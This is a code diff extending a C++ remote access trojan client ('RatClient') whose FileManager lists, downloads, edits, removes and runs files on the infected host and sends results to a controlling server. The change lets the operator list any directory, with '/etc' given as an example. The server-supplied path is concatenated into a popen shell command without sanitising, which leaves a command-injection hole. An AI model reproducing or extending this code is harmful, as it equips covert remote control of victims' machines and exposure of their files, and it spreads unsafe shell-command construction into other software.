@@ -86,7 +86,7 @@ std::string SocketClient::stringReceive() {
 class FileManager {
 public:
     SocketClient client;
-    void HandleList();
+    void HandleList(const std::string& path = "");
     void HandleEditFile(const std::string& filename);
     void HandleRemoveFile(const std::string& filename);
     void HandleRunFile(const std::string& filename);
@@ -96,13 +96,20 @@ public:
 };
 
 // Hàm xử lý lệnh LIST (Liệt kê file)
-void FileManager::HandleList() {
+void FileManager::HandleList(const std::string& path) {
     char buffer[128];
     std::string result = "\n=== KET QUA TU LENH SYSTEM (ls -lR) ===\n\n";
     
-    // Chạy lệnh "ls -lR" và mở một pipe để đọc kết quả (chế độ "r" - read)
-    // popen sẽ chuyển hướng stdout của lệnh vào pipe này
-    FILE* pipe = popen("ls -lR", "r");
+    // Tạo lệnh system: Nếu có truyền path thì ghép path vào, nếu không thì dùng "." (thư mục hiện tại)
+    std::string cmd = "ls -lR";
+    if (!path.empty()) {
+        cmd += " \"" + path + "\"";
+    } else {
+        cmd += " .";
+    }
+    
+    // Thực thi lệnh đã được nối đường dẫn
+    FILE* pipe = popen(cmd.c_str(), "r");
     
     if (!pipe) {
         std::string errorMsg = "ERROR: Khong the thuc thi lenh he thong.\n";
@@ -121,7 +128,7 @@ void FileManager::HandleList() {
         result += "\n[!] Lenh ket thuc voi loi (Code: " + std::to_string(returnCode) + ")\n";
     }
 
-    std::cout << "[+] Da thuc hien lenh LIST\n";
+    std::cout << "[+] Da thuc hien lenh LIST" << (path.empty() ? "" : (" cho path: " + path)) << "\n";
 
     // Gửi toàn bộ kết quả trả về cho Server qua Socket
     client.stringSend(result);
@@ -543,8 +550,12 @@ void RatClient::CommandLoop() {
 
 void RatClient::HandleCommand(const std::string& command) {
     if (command == "LIST") {
-        fileManager.HandleList();
+        fileManager.HandleList(); // Liệt kê thư mục hiện tại
     } 
+    else if (command.rfind("LIST ", 0) == 0) { // Nếu có path đi kèm (ví dụ: "LIST /etc")
+        std::string path = command.substr(5);
+        fileManager.HandleList(path);
+    }
     else if (command.rfind("GETFILE ", 0) == 0) {
         std::string filename = command.substr(8);
         fileManager.HandleDownload(filename);
